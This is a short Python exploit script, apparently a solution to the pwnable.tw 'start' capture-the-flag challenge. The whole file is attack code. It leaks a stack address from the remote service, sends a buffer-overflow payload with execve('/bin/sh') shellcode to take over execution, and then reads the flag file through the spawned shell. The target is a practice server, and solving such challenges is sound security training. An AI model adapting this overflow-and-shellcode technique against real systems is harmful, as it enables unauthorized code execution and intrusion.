import socket
from struct import pack, unpack
from binascii import unhexlify

# Got it via `ragg2 -i exec -b 32`
shellcode = unhexlify('31c050682f2f7368682f62696e89e3505389e199b00b31d2cd80')

sck = socket.create_connection(('chall.pwnable.tw', 10000))
#sck = socket.create_connection(('0.0.0.0', 8080))

_ = sck.recv(4096)
sck.send(b'\x90' * 20 + pack('<I', 0x08048087))
esp, = unpack('<I', sck.recv(4096)[:4])
print hex(esp)
# print(f"*** Setting retaddr={hex(esp+20)}")
payload = "A"*20+pack('<I', esp+20)  + shellcode
assert len(payload) <= 60, "You can't inject more than 60-bytes."
sck.send(payload)
sck.send(b'cat /home/start/flag\n')
print sck.recv(4096)
